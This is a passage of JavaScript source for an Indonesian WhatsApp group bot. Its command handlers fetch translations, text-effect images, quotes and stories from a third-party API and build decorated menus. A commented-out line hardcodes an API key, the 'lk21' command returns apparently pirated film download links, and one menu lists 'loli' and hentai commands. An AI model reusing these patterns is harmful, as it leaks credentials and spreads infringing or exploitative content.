dimas.sendMessage(from, tts, audio, {mimetype: 'audio/mp4', filename: `${tts}.mp3`, quoted: freply,ptt : true})
//limitAdd(sender, limit)
break
case 'translate':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
                //if (isLimit(sender)) return reply(ind.limitend(pusname))
                //if (isBanned) return reply('Maaf kamu sudah terbenned!')
                reply(mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} en Tahu Bacem`)
                    kode_negara = args[0]
                    args.shift()
                    ini_txt = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${lol}&text=${ini_txt}`)
                    get_result = get_result.result
                    init_txt = `From : ${get_result.from}\n`
                    init_txt += `To : ${get_result.to}\n`
                    init_txt += `Original : ${get_result.original}\n`
                    init_txt += `Translated : ${get_result.translated}\n`
                    init_txt += `Pronunciation : ${get_result.pronunciation}\n`
                    reply(init_txt)
                    break
                case 'tiktoktext':
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})

                                if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lol}&text1=${txt1}&text2=${txt2}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`Follow @dimas.edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                                if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
             buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lol}&text=${ini_txt}`)
               buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`Follow @dimas.edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        
                    break
                   case 'setwelcome':
					  
					  if (args.length < 1) return reply('*Teks nya mana gan?*')
                    dimas.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					join = body.slice(11)
					dimas.sendMessage(from ,`\`\`\`Welcome berhasil di ubah menjadi : ${body.slice(11)}\`\`\``, text,{quoted : freply})
				break 
				
                         case 'public':
        	  if (!dim.key.fromMe) return 
              if (banChats === false) return 
              banChats = false
              textImg(`Sukses mode publik gan`)
              break
case "set":
case "mode":
        if (!dim.key.fromMe) return;
        sendButMessage(from, `SELF OR PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `⬡ SELF `,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `⬡ PUBLIC`,
            },
            type: 1,
          },
        ]);
        break;
	      case 'self':
              if (!dim.key.fromMe) return 
              if (banChats === true) return
        	  uptime = process.uptime()
        	  banChats = true
              textImg(`Success mode self gan`)
              break
                case 'quotes':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${setting.lolkey}`)
                    quotes = quotes.result
                    author = quotes.by
                    quotes = quotes.quote
                    reply(`_${quotes}_\n\n*â€• ${author}*`)
                    break
                case 'quotesanime':
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${setting.lolkey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n*• ${char}*\n*• ${anime} ${episode}*`)
                    break
                case 'quotesdilan':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quotes/diLan?apikey=${setting.lolkey}`)
                     reply(get_result.result)

                   break
                   case 'brainly':
                 /*  if (args.length == 0) return reply(`Example ${prefix+command} Apa itu cinta`)
                    reply('Mencari.....')
                   cari = body.slice(9)
                   jawab = await fetchJson(`https://api.vhtear.com/branly?query=${cari}&apikey=dimasGans2k20PPhu`)
                   reply (jawab.result.data, {quoted:freply})
                    break */
                case 'quotesimage':
                    buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`)
                    buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText: ini_txt,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
                 break
                case 'faktaunik':
                case 'katabijak':
                case 'pantun':
                case 'bucin':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`)
                   titid = get_result.result
                   sendButMessage(from, titid, `Klik Untuk Ke Quotes Selanjutnya`, [
          {
            buttonId: `${prefix + command}`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
        break;
                    break
                case 'randomnama':
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${setting.lolkey}`)
                    dimi = anu.result
                   sendButMessage(from, dimi, `Klik Untuk Ke Quotes Selanjutnya`, [
          {
            buttonId: `${prefix + command}`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
        break;
                    break
       // Movie & Story
                case 'lk21':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${lol}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.Language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await dimas.sendMessage(from, thumbnail, image, { quoted: dim, caption: ini_txt })
                    break
                case 'drakorongoing':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=${setting.lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'wattpad':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpuLan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=${lol}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    await dimas.sendMessage(from, thumbnail, image, { quoted: dim, caption: ini_txt })
                    break
                case 'wattpadsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${lol}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cerpen':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${setting.lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    titid = ini_txt
                   sendButMessage(from, titid, `Klik Untuk Ke Quotes Selanjutnya`, [
          {
            buttonId: `${prefix + command}`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
        break;
                    break
                case 'ceritahoror':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${setting.lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    buff = await getBuffer(get_result.thumbnail)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText: ini_txt,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        break
case 'soundlist':
case 'soundmenu':
 groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
        
               menu =`${botName}


               
▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

┌────────────────
│ 「 *SOUND MENU* 」 
│
┣𖥻ꦼꦽ➳iri
┣𖥻ꦼꦽ➳pale
┣𖥻ꦼꦽ➳sound
┣𖥻ꦼꦽ➳sound1
┣𖥻ꦼꦽ➳sound2
┣𖥻ꦼꦽ➳sound3
┣𖥻ꦼꦽ➳sound4
┣𖥻ꦼꦽ➳sound5
┣𖥻ꦼꦽ➳sound6
┣𖥻ꦼꦽ➳sound7
┣𖥻ꦼꦽ➳sound 8-71
┣𖥻ꦼꦽ➳tapi
┣𖥻ꦼꦽ➳boong
┣𖥻ꦼꦽ➳magic
┣𖥻ꦼꦽ➳menyukaiku
│
│ *Musik🎧* 
│
┣𖥻ꦼꦽ➳sad
┣𖥻ꦼꦽ➳sad2
┣𖥻ꦼꦽ➳sad3
┣𖥻ꦼꦽ➳sad4
┣𖥻ꦼꦽ➳aeshtetic
┣𖥻ꦼꦽ➳aeshtetic2
┣𖥻ꦼꦽ➳aeshtetic3
┣𖥻ꦼꦽ➳aeshtetic4
┣𖥻ꦼꦽ➳home
┣𖥻ꦼꦽ➳gettingold
┣𖥻ꦼꦽ➳allnight
┣𖥻ꦼꦽ➳lucas
┣𖥻ꦼꦽ➳wanna
┣𖥻ꦼꦽ➳yourskin
┣𖥻ꦼꦽ➳up
┣𖥻ꦼꦽ➳cutmeoff
┣𖥻ꦼꦽ➳beautiful
┣𖥻ꦼꦽ➳loosinggame
┣𖥻ꦼꦽ➳loosinginterest
┣𖥻ꦼꦽ➳playdate
│
│ *islam☪️*
│
┣𖥻ꦼꦽ➳Arrahman {8,5mb} 
┣𖥻ꦼꦽ➳Yasin {23,8mb} 
┣𖥻ꦼꦽ➳ayatkursi2
┣𖥻ꦼꦽ➳tilawah
┣𖥻ꦼꦽ➳sholawatnabi
┣𖥻ꦼꦽ➳ngaji
┣𖥻ꦼꦽ➳ngaji2
└───────────────
` 
buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Nakano.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   

 [ *_HURUF KECIL SEMUA!!_* ]
 Fitur ini gak pakai prefix`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
               case 'groupmenu':
        case 'menugroup':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
        
               menu =`${botName}


               
▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*



┏⬡  𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ɢʀᴏᴜᴘꜱᴇᴛᴛɪɴɢ
┃▹  ᴀꜰᴋ *ᴀʟᴀꜱᴀɴ*
┃▹  ᴄᴇᴋꜱᴇᴡᴀ
┃▹  ᴋɪᴄᴋᴀʟʟ
┃▹  ɪɴꜰᴏɢʀᴜᴘ
┃▹  ᴘʀᴏᴍᴏᴛᴇ
┃▹  ᴅᴇᴍᴏᴛᴇ
┃▹  ʟɪꜱᴛᴏɴʟɪɴᴇ
┃▹  ᴛᴀɢᴀʟʟ *ᴛᴇᴋꜱ*
┃▹  ʟᴇᴀᴠᴇ
┃▹  ᴋɪᴄᴋ *ʀᴇᴘʟʏ*
┃▹  ᴀᴅᴅ *+62xxxxxx*
┃▹  ꜱᴇᴛɢʀᴜᴘɴᴀᴍᴇ
┃▹  ꜱᴇᴛᴘᴘɢʀᴜᴘ
┃▹  ꜱᴇᴛᴅᴇꜱᴄ
┃▹  ꜱɪᴅᴇʀ *ʀᴇᴘʟʏ ᴄʜᴀᴛ ʙᴏᴛ*
┃▹  ʜɪᴅᴇᴛᴀɢ *ᴛᴇᴋꜱ/ʀᴇᴘʟʏ ᴛᴇᴋꜱ*
┗⬡

𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
 𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞
`

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
        case 'storymenu':
        case 'moviemenu':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
        
               menu =`${botName}


               
┏⬡  𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹ ${prefix}drakorongoing
┃▹ ${prefix}lk21 query
┃▹ ${prefix}wattpad url_wattpad
┃▹ ${prefix}wattpadsearch query
┃▹ ${prefix}cerpen
┃▹ ${prefix}ceritahoror
┗⬡

𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
 𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞
`

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
        case 'randomtext':
        case 'random':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
        
               menu =`${botName}


               
┏⬡  𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹ ${prefix}quotes
┃▹ ${prefix}quotesdiLan
┃▹ ${prefix}quotesanime
┃▹ ${prefix}quotesimage
┃▹ ${prefix}faktaunik
┃▹ ${prefix}katabijak
┃▹ ${prefix}pantun
┃▹ ${prefix}bucin
┃▹ ${prefix}randomnama
┗⬡

𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
 𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞
`

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
        
        case 'ownermenu':
        case  'menuowner':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
           menu =`${botName}
           
           
▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

    
┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}bc *teks*
┃▹  ${prefix}bc2 *teks*
┃▹  ${prefix}term
┃▹  ${prefix}self
┃▹  ${prefix}public
┃▹  ${prefix}eval
┃▹  ${prefix}reset
┃▹  ${prefix}clearall
┃▹  ${prefix}leaveall
┃▹  ${prefix}addvn
┃▹  ${prefix}getvn
┃▹  ${prefix}addimage
┃▹  ${prefix}getimage
┃▹  ${prefix}addvideo
┃▹  ${prefix}getvideo
┃▹  ${prefix}slow
┃▹  ${prefix}leaveall
┃▹  ${prefix}join *link gc*
┃▹  ${prefix}shutdown
┃▹  ${prefix}getquoted
┃▹  ${prefix}addupdate *fiturnya*
┃▹  ${prefix}exif *nama|author*
┃▹  ${prefix}sewa add/del *waktunya*
┃▹  ${prefix}premium add @tag|nomor
┃▹  ${prefix}premium del @tag|nomor
┗⬡


 𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
  𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞`

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   


 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
        
       case 'wibumenu1':
        case  'menuwibu':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
           menu =`${botName}


▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

    
  
┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}loli
┃▹  ${prefix}manga
┃▹  ${prefix}anime 
┃▹  ${prefix}lolivideo
┃▹  ${prefix}husbu
┃▹  ${prefix}waifu
┃▹  ${prefix}milf
┃▹  ${prefix}neko
┃▹  ${prefix}kanna
┃▹  ${prefix}sagiri
┃▹  ${prefix}hentai
┃▹  ${prefix}cosplay
┃▹  ${prefix}wallnime
┃▹  ${prefix}kusonime
┃▹  ${prefix}megumin
┃▹  ${prefix}otakudesu
┃▹  ${prefix}doujindesu
┃▹  ${prefix}storyanime
┃▹  ${prefix}nakanomiku
┃▹  ${prefix}nakanoikyy
┃▹  ${prefix}nakanoitsuki
┃▹  ${prefix}otakuongoing
┃▹  ${prefix}nhentai *code*
┃▹  ${prefix}nekopoi *link*
┃▹  ${prefix}nekopoi3d
┃▹  ${prefix}nekopoicosplay
┃▹  ${prefix}nekopoisearch
┗⬡
`

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   



 𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
  𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


